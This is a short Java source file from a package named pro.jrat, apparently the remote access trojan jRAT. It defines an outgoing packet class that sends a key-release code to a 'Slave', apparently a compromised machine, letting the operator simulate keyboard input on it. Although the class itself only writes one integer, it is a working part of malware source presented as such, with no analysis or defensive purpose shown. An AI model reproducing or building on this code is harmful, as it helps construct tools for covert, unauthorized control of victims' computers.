package pro.jrat.packets.outgoing;

import java.io.DataOutputStream;

import pro.jrat.Slave;


public class Packet95KeyRelease extends AbstractOutgoingPacket {
	
	private int keyCode;
	
	public Packet95KeyRelease(int keyCode) {
		this.keyCode = keyCode;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		dos.writeInt(keyCode);
	}

	@Override
	public byte getPacketId() {
		return 95;
	}

}
